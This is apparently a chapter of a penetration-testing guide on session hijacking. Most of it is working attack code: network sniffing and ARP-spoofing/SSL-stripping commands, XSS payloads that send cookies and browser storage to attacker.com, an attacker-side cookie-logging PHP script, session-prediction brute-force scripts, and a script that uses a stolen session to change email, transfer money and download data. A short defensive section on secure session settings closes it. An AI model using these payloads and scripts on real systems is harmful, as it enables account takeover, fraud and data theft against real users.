# 1. SESSION HIJACKING <a name="session-hijacking"></a>

## 1.1 THEORY & BACKGROUND

### What is Session Hijacking?

**Session hijacking** (cookie hijacking) is when an attacker steals or predicts a valid session token to gain unauthorized access to a user's session.

**Session Management Flow:**
```
1. User logs in with credentials
2. Server creates session, generates session ID
3. Session ID sent to client (usually in cookie)
4. Client includes session ID in subsequent requests
5. Server validates session ID, grants access
```

**Attack Goal:** Obtain victim's session ID → impersonate victim

### Session Token Locations

**Common storage:**
- Cookies (most common)
- URL parameters (insecure!)
- Hidden form fields
- HTTP headers (Authorization)
- Local/Session Storage (JavaScript)

---

## 1.2 SESSION HIJACKING TECHNIQUES

### 1.2.1 Session Sniffing (Network Interception)

**Capturing Sessions Over HTTP:**

```bash
# Using Wireshark
# 1. Start capture on network interface
# 2. Filter: http.cookie
# 3. Look for Set-Cookie and Cookie headers
# 4. Extract session ID

# Using tcpdump
tcpdump -i eth0 -A 'tcp port 80' | grep -i cookie

# Capture to file
tcpdump -i eth0 -w capture.pcap 'tcp port 80'

# Extract cookies from pcap
tshark -r capture.pcap -Y "http.cookie" -T fields -e http.cookie

# Using Ettercap (MITM)
ettercap -T -q -i eth0 -M arp:remote /gateway_ip// /victim_ip//
# View captured sessions in Ettercap interface

# Using Bettercap
bettercap -iface eth0
> net.probe on
> set arp.spoof.targets VICTIM_IP
> arp.spoof on
> set net.sniff.filter 'tcp port 80'
> net.sniff on
# Sessions captured and displayed
```

**Using Captured Session:**

```bash
# Captured session cookie:
# PHPSESSID=abc123def456

# Use with curl:
curl -b "PHPSESSID=abc123def456" http://victim-site.com/admin

# Use with browser:
# 1. Open Developer Tools (F12)
# 2. Console tab
# 3. Enter: document.cookie = "PHPSESSID=abc123def456"
# 4. Refresh page → logged in as victim!

# Or use cookie editor extension
```

### 1.2.2 XSS-Based Session Stealing

**Cookie Stealing via XSS:**

```html
<!-- Reflected XSS payload -->
<script>
document.location='http://attacker.com/steal.php?cookie='+document.cookie;
</script>

<!-- Or using Image -->
<script>
new Image().src='http://attacker.com/steal.php?c='+document.cookie;
</script>

<!-- Or using Fetch API -->
<script>
fetch('http://attacker.com/steal.php?c='+document.cookie);
</script>

<!-- URL encoded for injection -->
%3Cscript%3Edocument.location%3D%27http%3A%2F%2Fattacker.com%2Fsteal.php%3Fc%3D%27%2Bdocument.cookie%3B%3C%2Fscript%3E
```

**Attacker's Cookie Stealer (steal.php):**

```php
<?php
// steal.php on attacker's server
$cookie = $_GET['c'];
$ip = $_SERVER['REMOTE_ADDR'];
$timestamp = date('Y-m-d H:i:s');
$referer = isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : 'Unknown';

$log = "Time: $timestamp\nIP: $ip\nReferer: $referer\nCookie: $cookie\n\n";
file_put_contents('stolen_cookies.txt', $log, FILE_APPEND);

// Redirect to avoid suspicion
header('Location: http://google.com');
?>
```

**Advanced XSS Session Hijacking:**

```javascript
// Send full session details
<script>
var data = {
    cookies: document.cookie,
    localStorage: JSON.stringify(localStorage),
    sessionStorage: JSON.stringify(sessionStorage),
    url: window.location.href,
    userAgent: navigator.userAgent
};

fetch('http://attacker.com/steal.php', {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify(data)
});
</script>
```

### 1.2.3 Session Fixation

**Theory:** Force victim to use attacker-controlled session ID

**Exploitation:**

```bash
# 1. Attacker obtains session ID from vulnerable site
curl -i http://vulnerable-site.com/
# Response:
# Set-Cookie: PHPSESSID=attacker_session_123

# 2. Attacker crafts URL with fixed session
http://vulnerable-site.com/login?PHPSESSID=attacker_session_123

# Or sends cookie via JavaScript
http://vulnerable-site.com/login
<script>document.cookie="PHPSESSID=attacker_session_123"</script>

# 3. Victim clicks link, session set to attacker's value
# 4. Victim logs in (session ID unchanged!)
# 5. Attacker uses same session:
curl -b "PHPSESSID=attacker_session_123" http://vulnerable-site.com/admin
# Logged in as victim!
```

**Session Fixation Variants:**

```bash
# Method 1: URL parameter
http://site.com/login?session_id=attacker_value

# Method 2: Cookie via JavaScript
http://site.com/page.html
<script>document.cookie="session=attacker_value";</script>

# Method 3: Hidden form field
<form method="POST" action="http://site.com/login">
    <input type="hidden" name="session" value="attacker_value">
</form>

# Method 4: Custom header (if accepted)
curl -H "X-Session-ID: attacker_value" http://site.com/login
```

### 1.2.4 Session Prediction

**If session IDs are predictable:**

```python
# Example: Session IDs increment sequentially
# User A: SESSION_ID=1000
# User B: SESSION_ID=1001
# User C: SESSION_ID=1002

# Predict next session
import requests

for session_id in range(1000, 2000):
    cookies = {'PHPSESSID': str(session_id)}
    r = requests.get('http://vulnerable-site.com/admin', cookies=cookies)
    
    if 'Dashboard' in r.text:
        print(f"[+] Valid session found: {session_id}")
        print(r.text)
```

**MD5-based session prediction:**

```python
# If session = MD5(timestamp)
import hashlib, time, requests

# Try recent timestamps
current_time = int(time.time())

for timestamp in range(current_time - 3600, current_time + 1):
    session_id = hashlib.md5(str(timestamp).encode()).hexdigest()
    
    cookies = {'session': session_id}
    r = requests.get('http://site.com/admin', cookies=cookies)
    
    if r.status_code == 200:
        print(f"[+] Valid session: {session_id} (timestamp: {timestamp})")
```

### 1.2.5 Man-in-the-Middle (MITM)

**SSL Stripping:**

```bash
# Downgrade HTTPS to HTTP, capture sessions

# Using sslstrip
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080
sslstrip -l 8080

# Combine with ARP spoofing
arpspoof -i eth0 -t VICTIM_IP GATEWAY_IP
arpspoof -i eth0 -t GATEWAY_IP VICTIM_IP

# Victim's HTTPS requests downgraded to HTTP
# Session cookies captured in cleartext
```

**Using Bettercap with SSL stripping:**

```bash
bettercap -iface eth0

# In bettercap:
> set http.proxy.sslstrip true
> http.proxy on
> set arp.spoof.targets VICTIM_IP
> arp.spoof on
> net.sniff on

# Captures sessions even from HTTPS sites
```

### 1.2.6 Session Side-Jacking (Firesheep-style)

**Capturing sessions on shared WiFi:**

```python
# Modern implementation
from scapy.all import *

def packet_handler(packet):
    if packet.haslayer(HTTPRequest):
        http_layer = packet.getlayer(HTTPRequest)
        
        # Extract cookies
        if packet.haslayer(Raw):
            load = packet[Raw].load.decode(errors='ignore')
            if 'Cookie:' in load:
                print(f"[+] Captured cookies from {packet[IP].src}")
                print(load)

# Sniff on WiFi interface
sniff(iface="wlan0", prn=packet_handler, filter="tcp port 80", store=0)
```

---

## 1.3 POST-HIJACKING EXPLOITATION

### 1.3.1 Using Hijacked Session

**Browser-based:**

```javascript
// Method 1: Developer Console
// 1. Open DevTools (F12)
// 2. Console tab
// 3. Set cookie:
document.cookie = "session=hijacked_session_id; path=/";

// 4. Refresh page
location.reload();

// Method 2: EditThisCookie extension (Chrome/Firefox)
// 1. Install extension
// 2. Click extension icon
// 3. Add/edit cookies
// 4. Refresh page
```

**Command Line:**

```bash
# Using curl
curl -b "session=hijacked_session_id" http://victim-site.com/account

# Using wget
wget --header="Cookie: session=hijacked_session_id" http://victim-site.com/admin

# Multiple cookies
curl -b "session=abc123; user_id=456; role=admin" http://site.com/admin
```

**Automated Session Riding:**

```python
import requests

# Hijacked session
session_id = "abc123def456"
cookies = {'PHPSESSID': session_id}

# Test access
r = requests.get('http://victim-site.com/account', cookies=cookies)

if 'Account Dashboard' in r.text:
    print("[+] Session valid!")
    
    # Perform actions as victim
    # Change email
    requests.post('http://victim-site.com/update-email', 
                  cookies=cookies,
                  data={'email': 'attacker@evil.com'})
    
    # Transfer money
    requests.post('http://victim-site.com/transfer',
                  cookies=cookies,
                  data={'to': 'attacker_account', 'amount': 10000})
    
    # Download sensitive data
    data = requests.get('http://victim-site.com/download/documents',
                       cookies=cookies)
    with open('stolen_data.zip', 'wb') as f:
        f.write(data.content)
```

---

## 1.4 PREVENTION

**Secure Session Management:**

```php
<?php
// PHP Secure Session Implementation

// 1. Use HTTPS only
ini_set('session.cookie_secure', 1);  // Cookie only sent over HTTPS
ini_set('session.cookie_httponly', 1); // Cookie not accessible via JavaScript
ini_set('session.cookie_samesite', 'Strict'); // CSRF protection

// 2. Regenerate session ID after login
session_start();

if ($_SERVER['REQUEST_METHOD'] === 'POST' && validate_login()) {
    // Regenerate session ID
    session_regenerate_id(true);
    
    // Set session variables
    $_SESSION['user_id'] = $user_id;
    $_SESSION['logged_in'] = true;
}

// 3. Bind session to IP address
if (isset($_SESSION['ip_address'])) {
    if ($_SESSION['ip_address'] !== $_SERVER['REMOTE_ADDR']) {
        // IP changed, destroy session
        session_destroy();
        die('Session security error');
    }
} else {
    $_SESSION['ip_address'] = $_SERVER['REMOTE_ADDR'];
}

// 4. Bind session to User-Agent
if (isset($_SESSION['user_agent'])) {
    if ($_SESSION['user_agent'] !== $_SERVER['HTTP_USER_AGENT']) {
        session_destroy();
        die('Session security error');
    }
} else {
    $_SESSION['user_agent'] = $_SERVER['HTTP_USER_AGENT'];
}

// 5. Session timeout
$timeout = 1800; // 30 minutes
if (isset($_SESSION['last_activity'])) {
    if (time() - $_SESSION['last_activity'] > $timeout) {
        session_destroy();
        die('Session expired');
    }
}
$_SESSION['last_activity'] = time();

// 6. Logout properly
function logout() {
    session_start();
    $_SESSION = array();
    
    if (isset($_COOKIE[session_name()])) {
        setcookie(session_name(), '', time()-3600, '/');
    }
    
    session_destroy();
}
?>
```

```javascript
// Node.js/Express Secure Session

const session = require('express-session');
const RedisStore = require('connect-redis')(session);

app.use(session({
    store: new RedisStore({client: redisClient}),
    secret: 'strong-random-secret-key',
    resave: false,
    saveUninitialized: false,
    name: 'sessionId', // Don't use default 'connect.sid'
    cookie: {
        secure: true,      // HTTPS only
        httpOnly: true,    // No JavaScript access
        sameSite: 'strict', // CSRF protection
        maxAge: 1800000    // 30 minutes
    }
}));

// Session validation middleware
app.use((req, res, next) => {
    if (req.session.userId) {
        // Check IP binding
        if (req.session.ipAddress !== req.ip) {
            req.session.destroy();
            return res.status(403).send('Session security error');
        }
        
        // Check User-Agent binding
        if (req.session.userAgent !== req.get('User-Agent')) {
            req.session.destroy();
            return res.status(403).send('Session security error');
        }
    }
    next();
});

// Regenerate session on login
app.post('/login', (req, res) => {
    // After validating credentials
    req.session.regenerate((err) => {
        if (err) return res.status(500).send('Error');
        
        req.session.userId = user.id;
        req.session.ipAddress = req.ip;
        req.session.userAgent = req.get('User-Agent');
        
        res.send('Logged in');
    });
});

// Proper logout
app.post('/logout', (req, res) => {
    req.session.destroy((err) => {
        res.clearCookie('sessionId');
        res.send('Logged out');
    });
});
```

---